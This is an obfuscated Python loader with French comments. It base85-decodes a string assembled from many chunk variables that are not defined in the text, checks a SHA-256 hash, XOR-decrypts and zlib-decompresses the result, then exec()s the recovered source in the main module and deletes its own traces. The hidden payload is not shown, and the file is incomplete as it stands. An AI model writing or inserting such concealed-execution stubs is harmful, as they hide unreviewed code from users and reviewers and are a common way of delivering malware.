_pagvfbEHTVQwOh = __import__('base64').b85decode(_ccvHZ6B7RmGSJS + _caMLrG6pCHHTHS + _ct0gRhYMgUH12b + _cycg4eTELXqFav + _clJTuAYnV6oBXV + _czyv56JFHspAGp + _ca3FvOe0R3ral0 + _csQTtye4ljZeRe + _cpFnXZGsLBS6Wx + _cg7ahULY94nazv + _ccvnTDBMofMFg0 + _czWQFoWXL3UEMd + _cxQqSbvqqdW9vd + _cyvEzyByEh6rBl + _cidDjihE73tJvO + _cm__8T_xIuy_oK + _cbF3vIQ5RpbK20 + _cpJsag0CM0b9L7 + _cyVY9EHynXWRpI + _cgOJamxVaENYZn + _cbysjDNTEjeVzv + _cho9EfKdrIQE2c + _cicjPnA_CLAnlH + _cmk7J3S5uM_nRW + _cpF5nzZlD1Ov6s + _crtAX9DOdBN8r3 + _cf03sfUJGujmub + _caSfjUsN3xRxC8 + _cpw66ScY7eqVYj + _cprg_u2lpH8ba9 + _chsqOeAMPvRS5_ + _cmFI6drF0brW6s + _cwBsjUqU9g7GOw + _cbM4hOb8b57g_n + _cb34loYtaTvDTh + _cw0rO30VPLLmFo + _cekN70XdmsvLp4 + _cgPwjeSJK0UcTX + _cgsUeYVGqXEr0Q + _clAE6eyUOUoxVQ + _crLiGrbReX3jd7 + _cjLRK5i9rpTsrO + _ce_Wlrqs5nHQOM + _cf9R63IUd_M5Bl + _cmi0JPXTYFwP3p + _coKEyMQQEeeT5t + _cf8inro9Nn7U3R + _ceN4XTEBWltOxD + _ceUMVauIQsioWr + _c_pH0Prnkx6Czj + _czEzkE7ykGXg2x + _cq0ybXO1VmB9ay + _cowi6ue6QhDRFT + _chcNqsyFWcTWjO + _cblzKQC4tbiN0P + _cxjO2F5gRlarS6 + _csFABJsfmCcoFV + _cms37776Q93iZN + _cfCbTYLNGXYWKu + _coYmID4CH5diwg + _cwb1CNHuWwnngU + _cemu4q_h3RqAmm + _cqYU3MmE7unJGs + _cic8N07hQAZ8Lo + _cy66TStRNBmrQw + _cu5HJXSEojIhiq + _cl68Pvxcb_bt3c + _cemEAC6Nw4V088 + _caV7iVQwJyHTer + _c_crRhSNm2jSq5 + _cuwemu27Euhc2B + _cnZbAwZsvmcLL3 + _cxh74QcgJhXJ_F + _cnvIWCIUAiE2nA + _cwi2dIeoBceW6s + _cwBSEfA96XkMGL + _cgA_2CUh2Oe3pJ + _cbC6q3X6ii8LcT + _cu7TC5KAg4AQxI + _ctnBAA0C5SAEgZ + _crjNk1KmtvXXqc + _cztRRJz6jREDoS + _crS7p77VwFGIDx + _cayhP8DJMgNY9J + _csh2Qko01jbQWY + _cuOabIzg0TG0zx + _cyKnSrlgKZJIzQ + _cbPHoXvUC1bKPK + _cgGU2pgXgvo2wj + _ckd4Y3gcQQBIpB + _ceeqsZOUeEmA0m + _caQXtKipaWtxOm + _crHw_bdvU3NUyh + _coJFrPyXwqpeD8 + _crLLllQ2IlAd8F + _cqYcTzgwVYPpuj + _cmmn_MHwdjaeSX + _coAKg07NtK3FwM + _c_JkDv53lx0NQ3 + _cwvaDcmZoFRKsu + _cjSzE7zOy0aN_e + _cvV4uYQ8qCUITs + _czIaaKLFASvQtv + _ccqu3adXJzE6sr + _csc1zS9fGpoIE3 + _cqPBX1AY7iKYe8 + _cp5wuWF9cHCvYT + _ckKI_EDvYpA79S + _cmfkvdn0G5ReL9 + _cuq6FMFqm2knRP + _cy28Fe2pXxZq3B + _c_8EvBzWHU6l0c + _cj4g72FbgHy6i3 + _cqYzCKziXMu6Hl + _cdUZ_YmBYSm8no + _ctGSEFHUg0pOeC + _clA3oS4y0mdlBN + _cecfauuRysl8X6 + _c_qXa1PO8d5tZJ + _csSYM6FspQMYxp + _cu7M9UxzkuCmkJ + _cgChm_IvJlgP7S + _cgTTQFlsT_buvD + _cseewBCgIMCIWb + _coRWkFH8tvAsfk + _cy_2sbrTJPsGRX + _cde2ABjfbQOmTM + _ckfdwkF_noGk_b + _cipENIhFSaToho + _cxOX71O49_B5pE + _cdak8aQW99YXOL + _chcqb3YbrdJv_r + _cyvfP_yZGr3tO_ + _cdvBtqtQYSGFoT + _crqGC_5DK6AfUY + _cqApOQbcHGNvnA + _cyk03gSG66nC1M + _ctSQPBupGlo0rw + _cvAjJMYee6qAJj + _clfHHs07Z68Cvo + _czPk8lqqNBrxFI + _czY3jMj9rN4dhT + _cmA2qkm_j7lnbQ + _cwJYeyviH3S3Iz + _cb3InuApuMovJM + _cqq1lt1H6YXiWQ + _cdqiZwcbudn3EP + _c_FyvKGtzmuHHg + _chk72gBL0A2FG3 + _ccCVnL252OGy0n + _czS6OF9VVRSBTK + _cg7XHfpzS713uu + _clRPTfqwx16vak + _coas7f1NKHOwB_ + _cnXuC5dvyef62m + _c_P1tqGtfOZK59 + _cwYUuW1DhKm81I + _creapMPG8qP_f7 + _ctTgk51MBV5mco + _ckdbKmSm4d8t4v + _c_fESoBXji5xqn + _clWoNZ_ekCQgVf + _cmCxFhGfwA9YFr + _cgQLPWOkKeHSCP + _cpmmNlENbIrF1V + _cq8ywnYQQ4epfx + _corUA5sZ0VVZq8 + _cyBVC_nN0asWXf + _crAXy92YEiTpOw + _ciRiiNHPJnaASr + _caR6yFRyIFVRFb + _ceuWwNdS53XTN9 + _cnwdc1kN_qUh2W + _cs_0rYqaKIVP55 + _cxav4TPVEGIVah + _ck0myTwEGhlv0P + _cdPy50_voCto6t + _cltpq6aaoghfDD + _cf4pmiHnaz2RMd + _cdKb1HyvLoG3US + _cotjyRQCjtM_pY + _cbL76x8cldB5JZ + _cdbEzDGcK3cNyW + _cb0YjthTTGVNDV + _cd3nFOHL2G68P7 + _cnft7biTisPFEA + _ca4ozD9C2szpfc + _csyRww6xjCw6zm + _cmSUrQrSZ_RDMA + _ckbB7AuBv8GC2r + _ctwlQbn5Pad_kc + _cyEgJFUq1NCCxE + _ckNUMt58ITT3ay + _cpP8EVYxRA68e9 + _csTwV2VZxqyrUf + _czE_AhbUfT5leW + _cjvgTYyXHzR539 + _crNY8p50R2TsdP + _cggxKQpC3AgDCb + _cdaShRHWOte0Ux + _cl6KmKwID_NIVA + _cixSj2LByNcLjj + _cyRFqKBU4uAGP2 + _cwzbuNVo0V4zJ_ + _cvsAVPSR1kQ6Jm + _czJtnMZRBCEbsO + _ckjI7VvFipC0vo + _cyuLPUNDTkKxAh + _cn9jpFqd2WoLw8 + _ct1G8SREki5WQb + _cboDsvBItOU7bq + _cmfdAkxy18VVJG)
if __import__('hashlib').sha256(_pagvfbEHTVQwOh).hexdigest() != '12c613998b1dd4636dd074feb23506fbdaa49c14b644db4cdbc641e06c997d8c':
    __import__('sys').exit(1)
_xhJDWUhehl0bWq = bytes([217, 118, 75, 24, 73, 49, 36, 150, 79, 240, 127, 133, 33, 75, 6, 211, 225, 13, 67, 55, 138, 64, 131, 219, 87, 204, 28])
_fkzzx7tHKaeGbzY = bytes([175, 247, 108, 191, 105, 198, 112, 95, 243, 167, 11, 92, 166, 21, 215, 111, 243, 70, 36, 144, 35, 76, 91, 12, 195, 116, 59])

def _fx_c6f8Tj6dtg5B(_bb8rFdcIGBA07Y, _kyYtJ3Lupfc9Ua):
    return bytes(_bb8rFdcIGBA07Y[_iwW_V8qXfFlymu] ^ _kyYtJ3Lupfc9Ua[_iwW_V8qXfFlymu % len(_kyYtJ3Lupfc9Ua)] for _iwW_V8qXfFlymu in range(len(_bb8rFdcIGBA07Y)))

def _fdpvCQWMIAlTVyv(_tncJV4u1LnNmUx):
    import zlib
    return zlib.decompress(_tncJV4u1LnNmUx) # Un seul niveau de zlib ici pour simplifier

def _fe_u4MRg7h9KJYO():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xiQzSJZEEn3w4Z = _fx_c6f8Tj6dtg5B(_pagvfbEHTVQwOh, _xhJDWUhehl0bWq)
    # 2. Décompression Zlib
    _duZUhlE_cnyJVf = _fdpvCQWMIAlTVyv(_xiQzSJZEEn3w4Z)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _duZUhlE_cnyJVf.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nnqdyaX_AlP2Qe = _main.__dict__
    _nnqdyaX_AlP2Qe.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nnqdyaX_AlP2Qe)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fe_u4MRg7h9KJYO()
try:
    del _fx_c6f8Tj6dtg5B, _fdpvCQWMIAlTVyv, _fe_u4MRg7h9KJYO
    del _pagvfbEHTVQwOh, _xhJDWUhehl0bWq, _fkzzx7tHKaeGbzY
except:
    pass
